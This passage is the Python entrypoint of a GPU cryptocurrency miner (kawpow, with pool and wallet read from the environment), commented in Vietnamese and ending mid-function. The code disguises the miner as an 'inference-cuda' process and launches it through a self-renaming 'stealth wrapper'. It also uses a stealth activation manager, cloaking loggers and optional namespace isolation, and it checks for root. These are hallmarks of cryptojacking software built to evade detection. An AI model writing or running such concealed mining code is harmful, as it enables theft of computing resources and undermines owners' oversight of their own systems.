"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
import re
import logging
import json  # ✅ [JSON] (JavaScript Object Notation – định dạng dữ liệu cấu hình)
import select  # ✅ [select] (thư viện chọn I/O đa kênh – non-blocking)
from pathlib import Path
from datetime import datetime

# Thêm thư mục **script** (kịch bản) vào sys.path để **resolve** (phân giải đường dẫn) các **local module imports** (nhập module cục bộ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# **GPU-Only Mode**: All CPU mining functionality has been permanently removed

# **Import** (nhập khẩu) các **module** (mô-đun – thành phần chức năng) từ **library** (thư viện) mining_environment
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts.module_loggers import (
    get_gpu_plugin_logger,
    log_gpu_plugin_operation
)
from mining_environment.scripts import setup_env
from mining_environment.scripts.resource_manager import ResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.privileged_operations import get_privileged_manager

# **Import** (nhập khẩu) **Stealth Activation Manager** (trình quản lý kích hoạt ẩn danh – centralized stealth system)
from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
# Enhanced PID Logger với Real Process Output Monitor
from pid_logger import start_worker, log_pid, register_process


# Performance tracking removed - simplified mining operations



# Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# **Main application logger** (logger ứng dụng chính)
logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')

# ---------- DEBUG GPU-ONLY LOGGING BOOSTER ----------
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
    GPU_LOGGERS = [
        'mining_environment.resource_control',
        'mining_environment.cloak_strategies',
        'gpu_plugin',  # GPU plugin debug logs
        'optimized_calc_chain',
    ]
    for _name in GPU_LOGGERS:
        _lg = get_unified_logger(_name)
        _lg.setLevel(logging.DEBUG)
        for _h in _lg.handlers:
            _h.setLevel(logging.DEBUG)
        _lg.debug('===== GPU-ONLY DEBUG MODE ENABLED =====')
except Exception as _dbg_err:
    logger.warning(f'GPU debug booster init failed: {_dbg_err}')
# ---------- END GPU BOOSTER ----------

# **GPU-Only Loggers** (Logger GPU chuyên dụng)
gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')

stop_event = threading.Event()
process_lock = threading.Lock()
# **GPU-Only Process Management** (Quản lý tiến trình GPU duy nhất)
gpu_process = None

# Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
privileged_manager_global = None

# Bổ sung các biến Event toàn cục cho giao tiếp thread nội bộ
env_setup_complete_event = threading.Event()
env_setup_failed_event = threading.Event()
resource_manager_failed_event = threading.Event()
shutdown_initiated_event = threading.Event()

def signal_handler(signum, frame):
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    """**Thread-safe environment initialization** (khởi tạo môi trường an toàn luồng) với **enhanced error handling** (xử lý lỗi nâng cao)"""
    logger.info("Bắt đầu thiết lập môi trường khai thác (Thread-Safe Mode).")
    
    try:
        # **Step 1: Privileged Manager** (Bước 1: Trình quản lý đặc quyền)
        logger.info("🔐 Initializing privileged manager...")
        privileged_manager = get_privileged_manager(logger)
        
        # **Step 2: Security Context Validation** (Bước 2: Xác thực bối cảnh bảo mật)
        logger.info("🔒 Validating security context...")
        security_context = privileged_manager.validate_security_context()
        logger.info(f"✅ Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
        
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
        
        # **Step 3: GPU Access Check** (Bước 3: Kiểm tra truy cập GPU)
        logger.info("🎮 Checking GPU access...")
        gpu_info = privileged_manager.check_gpu_access()
        logger.info(f"✅ Truy cập GPU: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
        
        # **Step 4: eBPF Filter Loading** (Bước 4: Tải bộ lọc eBPF) - DISABLED
        # DISABLE eBPF GPU telemetry để giải quyết lỗi std::bad_alloc
        logger.info("ℹ️ eBPF GPU telemetry đã được DISABLE để tránh memory conflicts")

        logger.info("🌍 Running centralized environment setup...")
        setup_env.setup()
        logger.info("✅ Thiết lập môi trường thành công.")
        
        return privileged_manager
        
    except Exception as e:
        error_msg = f"Lỗi khi thiết lập môi trường: {e}"
        logger.error(f"❌ {error_msg}")
        logger.error(f"🔍 Exception details: {type(e).__name__}: {str(e)}")
        
        # **Thread-safe error propagation** (truyền lỗi an toàn luồng)
        stop_event.set()
        raise RuntimeError(error_msg) from e
        
def start_resource_manager():
    """
    **DEPRECATED**: **Direct ResourceManager startup** (khởi động ResourceManager trực tiếp) - 
    **Replaced by resource_manager_thread()** (thay thế bằng resource_manager_thread())
    
    Note: Hàm này giữ lại để **backward compatibility** (tương thích ngược)
    """
    logger.warning("⚠️ start_resource_manager() is deprecated - use resource_manager_thread() instead")
    return None
    
    def resource_manager_worker():
        """
        **Worker function** (hàm công việc) chạy ResourceManager trực tiếp trong **separate thread** (luồng riêng biệt).
        """
        try:
            # **Step 1**: Load configuration từ JSON
            logger.info("📋 Step 1/4: Loading configuration from JSON...")
            config_path = Path(os.getenv('CONFIG_DIR', '/app/mining_environment/config')) / "resource_config.json"
            
            if not config_path.exists():
                raise FileNotFoundError(f"Configuration file not found: {config_path}")
                
            with open(config_path, 'r') as f:
                config_data = json.loads(f.read())
            
            config = ConfigModel(**config_data)
            logger.info("✅ Configuration loaded successfully")
            
            # **Step 2**: Initialize stealth activation system (EventBus replaced with DirectPIDRegistry)
            logger.info("📋 Step 2/5: Initializing stealth activation system...")
            # Note: EventBus completely removed - using DirectPIDRegistry for process communication
            
            # **Step 2.5**: Initialize Stealth Activation Manager (no EventBus needed)
            logger.info("📋 Step 2.5/5: Initializing Stealth Activation Manager...")
            stealth_init_success = initialize_stealth_activation(None)  # No event bus needed
            if stealth_init_success:
                logger.info("✅ Stealth Activation Manager initialized successfully")
            else:
                logger.warning("⚠️ Stealth Activation Manager initialization failed - continuing without external stealth")
            
            # **Step 3**: Create ResourceManager instance
            logger.info("📋 Step 3/5: Creating ResourceManager instance...")
            resource_manager = ResourceManager(config, None, logger)  # No event bus needed
            logger.info("✅ ResourceManager instance created")
            
            # **Step 4**: Start ResourceManager
            logger.info("📋 Step 4/5: Starting ResourceManager...")
            resource_manager.start()
            logger.info("🎯 ResourceManager đã được khởi động thành công")
            
        except Exception as e:
            error_msg = f"❌ Lỗi khi khởi động ResourceManager: {e}"
            logger.error(error_msg)
            logger.error(f"🔍 Exception details: {str(e)}")
            stop_event.set()
    
    # Tạo **background thread** (luồng nền) cho ResourceManager
    resource_thread = threading.Thread(
        target=resource_manager_worker,
        daemon=True,  # **Daemon thread** (luồng nền) sẽ tự động kết thúc khi main program kết thúc
        name="ResourceManagerThread"
    )
    
    # Khởi động **thread** (luồng) và **không chờ** nó hoàn thành (**non-blocking**)
    resource_thread.start()
    logger.info(f"✅ ResourceManager thread đã được khởi động (Thread ID: {resource_thread.ident})")
    
    # **Enhanced verification** (xác minh nâng cao) với **timeout protection** (bảo vệ timeout)
    verification_timeout = 5  # 5 giây thay vì 1 giây
    for i in range(verification_timeout):
        time.sleep(1)
        if resource_thread.is_alive():
            logger.debug(f"🔍 ResourceManager thread verification: alive ({i+1}/{verification_timeout}s)")
        else:
            logger.warning(f"⚠️ ResourceManager thread đã dừng sau {i+1}s")
            stop_event.set()
            break
    
    if resource_thread.is_alive():
        logger.info("🎯 ResourceManager thread đang chạy bình thường - Main thread có thể tiếp tục")
    else:
        logger.warning("⚠️ ResourceManager thread đã dừng ngay sau khi khởi động")
        stop_event.set()
    
    return resource_thread

def stop_resource_manager():
    """
    **DEPRECATED**: **Stop ResourceManager** (dừng ResourceManager) - 
    **Replaced by thread-based cleanup** (thay thế bằng dọn dẹp dựa trên luồng)
    
    Note: ResourceManager shutdown is now handled by thread termination
    """
    logger.warning("⚠️ stop_resource_manager() is deprecated - shutdown handled by thread cleanup")
    stop_event.set()

def is_mining_process_running(process):
    """
    ✅ ENHANCED: Kiểm tra tiến trình khai thác còn "sống" (running) hay không.
    - Trả về True khi `.poll()` chưa có mã thoát (None) **hoặc** mã thoát = 0 
      (một số wrapper script fork rồi thoát 0 ngay lập tức – nhưng tiến trình con vẫn chạy).
    """
    return bool(process) and (process.poll() is None or process.returncode == 0)

def rotate_log_file(log_path, max_size_mb=3):
    """
    **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
    **Delete log files** (xóa tệp nhật ký) khi vượt quá **size limit** (giới hạn kích thước).
    
    Args:
        log_path (str): Đường dẫn đến tệp log cần xoay vòng
        max_size_mb (int): Kích thước tối đa (MB) trước khi xóa (mặc định: 3MB)
    """
    if not os.path.exists(log_path):
        return
        
    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
    if file_size_mb > max_size_mb:
        os.remove(log_path)
        logger.info(f"Đã xóa tệp log do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")

def monitor_process_output(process, process_name, log_file, thread_logger):
    """
    **Monitor process output** (giám sát đầu ra tiến trình) - **simplified version** (phiên bản đơn giản) của dual_logger_thread.
    
    Args:
        process: **Process object** (đối tượng tiến trình)
        process_name (str): **Process name** (tên tiến trình) 
        log_file: **Log file handle** (tay cầm tệp log)
        thread_logger: **Thread logger instance** (thể hiện logger luồng)
    """
    try:
        thread_logger.info(f"🔍 Started monitoring output for {process_name}")
        
        while process and process.poll() is None:
            try:
                # **Simple output monitoring** (giám sát đầu ra đơn giản)
                if hasattr(process, 'stdout') and process.stdout:
                    line = process.stdout.readline()
                    if line:
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        formatted_line = f"[{timestamp}][{process_name}] {line.strip()}"
                        
                        # **Write to log file** (ghi vào tệp log)
                        if log_file and not log_file.closed:
                            log_file.write(f"{formatted_line}\n".encode('utf-8'))
                            log_file.flush()
                        
                        # **Log via thread logger** (ghi log qua thread logger)
                        thread_logger.debug(formatted_line)
                        
                time.sleep(0.5)  # **Short polling interval** (khoảng thời gian polling ngắn)
                
            except Exception as e:
                thread_logger.error(f"❌ Error reading process output: {e}")
                break
                
    except Exception as e:
        thread_logger.error(f"❌ Error in monitor_process_output: {e}")
    finally:
        if log_file and not log_file.closed:
            log_file.close()
        thread_logger.info(f"🔚 Stopped monitoring output for {process_name}")

def dual_logger_thread(process, log_file, process_name, log_lock):
    """
    Ghi nhật ký kép an toàn luồng nâng cao - truyền dữ liệu thời gian thực với phát hiện tốc độ băm và theo dõi các chỉ số hiệu suất.

    
    Args:
        process: Tiến trình cần theo dõi và ghi log
        log_file: Tệp log để ghi dữ liệu
        process_name (str): Tên tiến trình để hiển thị
        log_lock: Khóa luồng để đảm bảo thread-safe
    """
    # **GPU-Only Logger Assignment** (Gán logger cho GPU duy nhất)
    if 'gpu' in process_name.lower():
        thread_logger = gpu_miner_logger
    else:
        thread_logger = logger  # fallback to main logger
    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm – ghi lại các giá trị tốc độ tính toán)
    start_time = time.time()
    line_count = 0
    
    try:
        while True:
            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** (chọn lọc dữ liệu)
            ready, _, _ = select.select([process.stdout], [], [], 1.0)
            if not ready:
                # **Process termination check** (kiểm tra trạng thái kết thúc tiến trình)
                if process.poll() is not None:
                    break
                continue

            line = process.stdout.readline()
            # **EOF detection** (phát hiện kết thúc tệp dữ liệu)
            if line == '' and process.poll() is not None:
                break
                
            if line:
                line_count += 1
                
                # **Thread-safe logging block** (khối ghi nhật ký an toàn luồng)
                with log_lock:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    runtime = time.time() - start_time
                    
                    # **Enhanced log format** (định dạng nhật ký nâng cao) với **runtime info** (thông tin thời gian vận hành)
                    formatted_line = f"[{timestamp}][{process_name}][R:{runtime:.0f}s] {line.strip()}"
                    
                    # **Color-coded terminal output** (đầu ra terminal có mã màu – hiển thị với màu sắc phân biệt)
                    if "error" in line.lower() or "failed" in line.lower():
                        terminal_output = f"\033[91m{formatted_line}\033[0m"  # Red
                    elif "H/s" in line or "accepted" in line.lower():
                        terminal_output = f"\033[92m{formatted_line}\033[0m"  # Green
                    elif "connecting" in line.lower() or "started" in line.lower():
                        terminal_output = f"\033[94m{formatted_line}\033[0m"  # Blue
                    else:
                        terminal_output = formatted_line
                    
                    # **Real-time terminal display** (hiển thị terminal thời gian thực – cập nhật ngay lập tức)
                    print(terminal_output, flush=True)
                    
                    # **FIX: Use proper logger instead of direct file write** (sửa: dùng logger thay vì ghi file trực tiếp)
                    thread_logger.info(f"[{process_name}][R:{runtime:.0f}s] {line.strip()}")
                    
                    # **LEGACY: Keep binary file write for compatibility** (cũ: giữ ghi file nhị phân để tương thích)
                    log_file.write(f"{formatted_line}\n".encode('utf-8'))
                    log_file.flush()
                    
                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký) - **delete when over 3MB** (xóa khi vượt quá 3MB)
                    try:
                        if log_file.tell() > 3 * 1024 * 1024:  # 3MB limit
                            current_path = log_file.name
                            log_file.close()
                            os.remove(current_path)
                            logger.info(f"🗑️ Đã xóa log do vượt quá 3MB: {current_path}")
                            # **Reopen new file** (mở lại tệp mới)
                            log_file = open(current_path, 'ab', buffering=0)
                    except Exception as rot_err:
                        logger.warning(f"⚠️ Xóa log thất bại: {rot_err}")
                    
                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                    hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
                    if hash_rate_match:
                        hash_rate = float(hash_rate_match.group(1))
                        unit = hash_rate_match.group(2)
                        
                        # **Unit conversion** (chuyển đổi đơn vị đo lường)
                        multiplier = {
                            'H/s': 1,
                            'KH/s': 1000,
                            'MH/s': 1000000,
                            'GH/s': 1000000000,
                            'TH/s': 1000000000000
                        }
                        hash_rate_hz = hash_rate * multiplier.get(unit, 1)
                        
                        # **Hash rate tracking** (theo dõi và lưu trữ tốc độ băm)
                        hash_rates.append(hash_rate_hz)
                        
                        # **Performance metrics calculation** (tính toán các chỉ số hiệu suất chi tiết)
                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 mẫu dữ liệu
                            recent_avg = sum(hash_rates[-5:]) / 5
                            total_avg = sum(hash_rates) / len(hash_rates)
                            
                            # **Real-time metrics display** (hiển thị các chỉ số thời gian thực)
                            metrics_line = (f"\033[96m📊 METRICS [{process_name}]: "
                                          f"Current={hash_rate:.2f} {unit} | "
                                          f"Avg5={recent_avg:.2f} H/s | "
                                          f"TotalAvg={total_avg:.2f} H/s | "
                                          f"Samples={len(hash_rates)} | "
                                          f"Runtime={runtime:.0f}s\033[0m")
                            print(metrics_line, flush=True)
                        
                        # Hash rate logging removed - simplified monitoring
                    
                    # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                    if line_count % 100 == 0:
                        status_line = (f"\033[93m📈 STATUS [{process_name}]: "
                                     f"Lines={line_count} | Runtime={runtime:.0f}s | "
                                     f"HashSamples={len(hash_rates)}\033[0m")
                        print(status_line, flush=True)
                        
    except Exception as e:
        error_msg = f"❌ Lỗi trong dual_logger_thread [{process_name}]: {e}"
        logger.error(error_msg)
        print(f"\033[91m{error_msg}\033[0m", flush=True)
    finally:
        # **Cleanup** (dọn dẹp tài nguyên) và **final stats** (thống kê cuối cùng)
        try:
            if log_file and not log_file.closed:
                log_file.close()
            
            runtime = time.time() - start_time
            final_stats = (f"\033[95m🏁 FINAL STATS [{process_name}]: "
                         f"Runtime={runtime:.0f}s | Lines={line_count} | "
                         f"HashSamples={len(hash_rates)}")
            if hash_rates:
                total_avg = sum(hash_rates) / len(hash_rates)
                final_stats += f" | AvgHashRate={total_avg:.2f} H/s"
            final_stats += "\033[0m"
            
            print(final_stats, flush=True)
            logger.info(f"Luồng ghi log kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
            
        except Exception as cleanup_err:
            logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")

def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
    """
    **GPU-only Enhanced mining process** (quy trình khai thác GPU nâng cao) với **dual logging** (ghi nhật ký kép), 
    **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
    
    Args:
        retries (int): Số lần thử lại tối đa
        delay (int): Thời gian chờ giữa các lần thử (giây)
        privileged_manager: Trình quản lý quyền hạn
    
    Returns:
        subprocess.Popen: Tiến trình khai thác GPU nếu thành công, None nếu thất bại
    """
    # **🔧 DEBUG: GPU-only function entry logging** (ghi log đầu vào function GPU-only)  
    logger.info(f"🔍 [DEBUG] start_gpu_mining_process() called - GPU-only mode")
    
    executable = os.getenv('CUDA_COMMAND')
    logger.info(f"🔍 [DEBUG] GPU Executable path: {executable}")
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"GPU executable không hợp lệ hoặc không có quyền truy cập: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
        stop_event.set()
        return None

    miner_tag = 'gpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    
    # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
    rotate_log_file(str(miner_log_path))
    
    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
    log_lock = threading.Lock()

    # **GPU process name** (tên tiến trình GPU) cố định
    process_name = "inference-cuda"
    
    # **GPU Plugin logging integration** (tích hợp ghi log plugin GPU)
    log_gpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
    
    # **GPU mining command** (lệnh khai thác GPU) construction – đặt tham số thuật toán **trước** để tránh chế độ PCA
    cuda_loader = os.getenv('MLLS_CUDA', '/usr/lib/x86_64-linux-gnu/libcuda.so')

    # 🔍 DEBUG: Validate CUDA loader exists before use
    if not os.path.exists(cuda_loader):
        logger.warning(f"⚠️ CUDA loader not found: {cuda_loader}")
        # Fallback to standard CUDA library
        cuda_loader = '/usr/lib/x86_64-linux-gnu/libcuda.so'
        logger.info(f"🔄 Using fallback CUDA loader: {cuda_loader}")

    logger.info(f"🎮 GPU Mining - CUDA loader: {cuda_loader}")
    logger.info(f"🎮 GPU Mining - Loader exists: {os.path.exists(cuda_loader)}")

    # 🎯 Build command với cấu trúc rõ ràng: exec → thuật toán → pool → wallet → TLS → CUDA opts
    mining_command = [
        executable,
        '-a', 'kawpow',                 # Thuật toán bắt buộc đặt đầu để binary không vào PCA mode
        '-o', mining_server,
        '-u', mining_wallet,
        '--tls',
        '--cuda',
        f'--cuda-loader={cuda_loader}'
    ]
    # Thêm tuỳ chọn intensity để kiểm soát mức sử dụng VRAM (Giảm lỗi DAG out-of-memory)
    intensity_env = os.getenv('GPU_INTENSITY')
    if intensity_env:
        # mining_command.extend(['--intensity', intensity_env])  # removed because inference-cuda does not support --intensity
        logger.warning("⚠️ GPU_INTENSITY detected but ignored; --intensity unsupported by inference-cuda")
    else:
        logger.info("🎮 GPU Mining - INTENSITY parameter disabled (unsupported by binary)")
    logger.info(f"🎮 GPU Mining - CORRECT: Using CUDA backend với kawpow algorithm cho inference-cuda")

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")

    # ✅ GPU Environment Cleanup now handled by stealth_inference_cuda.py internally
    # No need for subprocess_env preparation here - stealth wrapper handles it
    # Tạo môi trường sạch, loại bỏ LD_PRELOAD để ngăn hook GPU làm sai cấu hình
    subprocess_env = os.environ.copy()
    subprocess_env.pop('LD_PRELOAD', None)
    
    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác GPU (Lần thử {attempt}/{retries})...")
        # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
        logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
        logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
        logger.info(f"🔍 GPU Debug - Environment: Default (stealth wrapper will create clean_env)")
        try:
            # **Create GPU subprocess** (tạo tiến trình con GPU) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
            if enable_stealth:
                # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) - RESTORED: Use correct inference-cuda wrapper
                stealth_wrapper_path = os.path.join(
                    os.path.dirname(os.path.abspath(__file__)),
                        "mining_environment", "stealth", "wrappers", "stealth_inference_cuda.py"
                    )
                
                if os.path.exists(stealth_wrapper_path):
                    # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
                    stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
                    miner_type = 'GPU'  # GPU-only mining
                    logger.info(f"🔒 [SELF-STEALTH] Using {miner_type} stealth wrapper: {stealth_wrapper_path}")
                    logger.info(f"🔍 [DEBUG] About to call subprocess.Popen with command: {stealth_command}")
                    
                    process = subprocess.Popen(
                        stealth_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1,
                        env=subprocess_env
                    )
                    logger.info(f"🔍 [DEBUG] subprocess.Popen completed successfully")
                    if process:
                        logger.info(f"✅ [SELF-STEALTH] {miner_type} stealth process started with PID: {process.pid}")
                        logger.info(f"🔍 [SELF-STEALTH] {miner_type} process will self-rename using internal stealth manager")
                else:
                    # Fallback to standard subprocess nếu wrapper không tồn tại
                    miner_type = 'GPU'  # GPU-only mining
                    logger.warning(f"⚠️ [SELF-STEALTH] {miner_type} stealth wrapper not found: {stealth_wrapper_path}")
                    logger.warning(f"⚠️ [SELF-STEALTH] Falling back to standard subprocess - no {miner_type} stealth")
                    logger.info(f"🔍 [DEBUG] About to call fallback subprocess.Popen with command: {mining_command}")
                    process = subprocess.Popen(
                        mining_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1,
                        env=subprocess_env
                    )
            elif enable_ns and privileged_manager:
                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                logger.info(f"🔍 GPU using namespace isolation")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1,
                    env=subprocess_env
                )
            else:
                # **Standard subprocess** (tiến trình con tiêu chuẩn)
                logger.info(f"🔍 GPU using standard subprocess")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1,
                    env=subprocess_env
                )
            
            if process:
                startup_time = time.time()
                miner_type = 'GPU'  # GPU-only mining
                logger.info(f"🔍 {miner_type} process created successfully with PID: {process.pid}")
                
                # **Enhanced startup logging** (ghi log khởi động nâng cao)
                startup_msg = (f"🚀 MINING PROCESS STARTED [{miner_type}]\n"
                             f"   ├─ Process Name: {process_name}\n"
                             f"   ├─ PID: {process.pid}\n"
                             f"   ├─ Command: {' '.join(mining_command)}\n"
                             f"   ├─ Log File: {miner_log_path}\n"
                             f"   ├─ Stealth Mode: {enable_stealth}\n"
                             f"   └─ Namespace Isolation: {enable_ns and privileged_manager is not None}")
                
                logger.info(startup_msg)
                print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                
                # Process registration removed - simplified process management
                
                # Enhanced PID Logger: Detect Real Mining PID (for stealth wrapper case)
                try:
                        process_type = "gpu"  # GPU-only mode
                        
                        # Wait for stealth wrapper to spawn child process
                        time.sleep(4)  # Increased from 2s to 4s for stealth initialization
                        
                        # 🚀 [PID RELATIONSHIP DETECTION] - Stealth-resistant detection using parent-child relationships
                        wrapper_pid = process.pid  # Current wrapper PID (e.g., 997)
                        target_cmd = "inference-cuda"  # GPU-only mode  
                        real_mining_pid = None
                        
                        logger.info(f"🔍 [PID-DETECTION] Starting PID Relationship Detection for wrapper PID {wrapper_pid}")
                        
                        try:
                            # METHOD 1: Direct children detection using psutil.Process().children()
                            wrapper_process = psutil.Process(wrapper_pid)
                            children = wrapper_process.children(recursive=True)  # Include nested children
                            
                            logger.info(f"🔍 [PID-DETECTION] Found {len(children)} child process(es) of wrapper PID {wrapper_pid}")
                            
                            for child in children:
                                try:
                                    child_info = child.as_dict(['pid', 'name', 'cmdline', 'exe', 'ppid', 'create_time'])
                                    logger.info(f"🔍 [PID-DETECTION] Analyzing child: PID={child_info['pid']}, name='{child_info.get('name', 'N/A')}', ppid={child_info.get('ppid', 'N/A')}")
                                    
                                    # Verify it's inference-cuda process using multiple criteria
                                    is_inference_cuda = False
                                    match_method = None
                                    
                                    # Check 1: Executable path
                                    if child_info.get('exe') and target_cmd in child_info['exe']:
                                        is_inference_cuda = True
                                        match_method = "executable"
                                        logger.info(f"✅ [PID-DETECTION] Match by executable: {child_info['exe']}")
                                    
                                    # Check 2: Command line arguments
                                    elif child_info.get('cmdline'):
                                        for arg in child_info['cmdline']:
                                            if target_cmd in str(arg):
                                                is_inference_cuda = True
                                                match_method = "cmdline"
                                                logger.info(f"✅ [PID-DETECTION] Match by cmdline: {child_info['cmdline']}")
                                                break
                                    
                                    # Check 3: Process age validation (started within last 2 minutes)
                                    if is_inference_cuda:
                                        process_age = time.time() - child_info['create_time']
                                        if process_age < 120:  # 2 minutes window
                                            real_mining_pid = child_info['pid']
                                            logger.info(f"🎯 [PID-DETECTION] Real mining PID detected: {real_mining_pid}")
                                            logger.info(f"🔍 [PID-DETECTION] Detection method: {match_method}")
                                            logger.info(f"🔍 [PID-DETECTION] Process details: name='{child_info.get('name', 'N/A')}' (may be spoofed by stealth)")
                                            logger.info(f"🔍 [PID-DETECTION] Process age: {process_age:.1f} seconds")
                                            break
                                        else:
                                            logger.info(f"⚠️ [PID-DETECTION] Process too old ({process_age:.1f}s), skipping PID {child_info['pid']}")
                                    
                                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                                    logger.debug(f"🔍 [PID-DETECTION] Child process access error: {e}")
                                    continue
                            
                        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                            logger.warning(f"⚠️ [PID-DETECTION] Cannot access wrapper process {wrapper_pid}: {e}")
                        
                        # METHOD 2: Fallback PPID search if children() method fails
                        if not real_mining_pid:
                            logger.info(f"🔍 [PID-DETECTION] Fallback: Manual PPID search for parent {wrapper_pid}")
                            
                            for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'exe', 'ppid', 'create_time']):
                                try:
                                    if proc.info.get('ppid') == wrapper_pid:
                                        # Validate this child is inference-cuda
                                        is_inference_cuda = False
                                        match_method = None
                                        
                                        # Check executable
                                        if proc.info.get('exe') and target_cmd in proc.info['exe']:
                                            is_inference_cuda = True
                                            match_method = "exe-fallback"
                                        
                                        # Check cmdline  
                                        elif proc.info.get('cmdline'):
                                            is_inference_cuda = any(target_cmd in str(arg) for arg in proc.info['cmdline'])
                                            match_method = "cmdline-fallback"
                                        
                                        if is_inference_cuda:
                                            process_age = time.time() - proc.info['create_time']
                                            if process_age < 120:  # 2 minutes window
                                                real_mining_pid = proc.info['pid']
                                                logger.info(f"🎯 [PID-DETECTION] Real mining PID found via PPID fallback: {real_mining_pid}")
                                                logger.info(f"🔍 [PID-DETECTION] Fallback detection method: {match_method}")
                                                break
                                        
                                except (psutil.NoSuchProcess, psutil.AccessDenied):
                                    continue
                        
                        if real_mining_pid:
                            # Register real mining process for Enhanced PID Logger
                            real_process_obj = psutil.Process(real_mining_pid)
                            register_process(real_mining_pid, process_type, real_process_obj, process_name)
                            logger.info(f"✅ Enhanced PID Logger registered real mining PID {real_mining_pid} ({process_type})")
                        else:
                            # Fallback: register wrapper PID
                            register_process(process.pid, process_type, process, process_name)
                            logger.warning(f"⚠️ Could not detect real mining PID, using wrapper PID {process.pid}")
                            
                except Exception as _pid_err:
                    logger.warning(f"Enhanced PID logger registration failed: {_pid_err}")
                    # Fallback to legacy log_pid và auto registration
                    try:
                        log_pid(process.pid, False)  # GPU-only: cpu=False
                        logger.info(f"✅ Fallback: logged PID {process.pid} via log_pid()")
                    except Exception as _fallback_err:
                        logger.error(f"Fallback PID logging also failed: {_fallback_err}")
                
                # Xác định PID sẽ sử dụng cho log/sự kiện (ưu tiên real_mining_pid nếu có)
                event_pid = real_mining_pid if real_mining_pid else process.pid
                # **Detailed operation logging** (ghi log thao tác chi tiết) - ĐỊNH NGHĨA TRƯỚC KHI SỬ DỤNG
                operation_details = {
                    'process_name': process_name,
                    'pid': event_pid,  # Always use real mining PID for logging
